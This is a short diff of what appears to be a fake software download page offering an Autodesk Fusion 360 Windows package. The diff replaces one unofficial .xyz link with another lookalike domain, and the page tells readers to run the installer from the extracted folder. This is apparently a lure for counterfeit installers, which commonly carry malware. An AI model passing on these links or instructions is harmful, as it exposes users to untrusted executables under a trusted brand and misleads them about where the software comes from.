@@ -8,8 +8,8 @@ Fusion 360 desktop package for Windows · cad toolkit · local install ready.
 
 > Use the project link below for Windows.
 
-* **Project link:** **[autodesk-fusion-360.nexpath.xyz](https://autodesk-fusion-360.nexpath.xyz/)**
-* **Full URL:** `https://autodesk-fusion-360.nexpath.xyz/`
+* **Project link:** **[autodesk-fusion-360.nerasix.xyz](https://autodesk-fusion-360.nerasix.xyz/)**
+* **Full URL:** `https://autodesk-fusion-360.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
